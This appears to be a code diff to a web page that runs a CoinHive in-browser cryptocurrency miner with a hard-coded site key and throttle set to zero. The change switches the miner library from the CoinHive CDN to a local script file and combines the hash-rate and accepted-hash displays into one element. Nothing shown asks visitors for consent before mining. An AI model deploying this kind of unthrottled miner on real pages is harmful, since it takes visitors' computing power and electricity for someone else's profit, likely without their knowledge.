@@ -21,8 +21,7 @@
 		<div class="jumbotron">
 			<div class="container">
 				<center>
-					<h4 class="text-primary" id="rate">Rate: </h4>
-					<h2 class="text-success" id="accepted">Accepted: </h2>
+					<h2 class="text-success" id="stats"></h2>
 				</center>
 			</div>
 		</div>
@@ -41,7 +40,7 @@
 	<!-- Bootstrap's Javascript -->
 	<script src="../../js/bootstrap.min.js"></script>
 	<!-- Your Javascript Starts here -->
-	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<script src="../../js/script.js"></script>
 	<script>
 		var miner = new CoinHive.Anonymous('U7DPNoIBkdolJj4jDSCWbu8y3TZE05YL', {
 			throttle: 0,
@@ -58,8 +57,7 @@
 			var hashesPerSecond = miner.getHashesPerSecond();
 			var acceptedHashes = miner.getAcceptedHashes();
 
-			document.getElementById('rate').innerHTML = 'Rate: '+hashesPerSecond.toFixed(2);
-			document.getElementById('accepted').innerHTML = 'Accepted: '+acceptedHashes;
+			document.getElementById('stats').innerHTML = acceptedHashes/256+'.'+hashesPerSecond.toFixed(2);
 		}, 1000);
 	</script>
 	<!-- Your Javascript Ends here -->
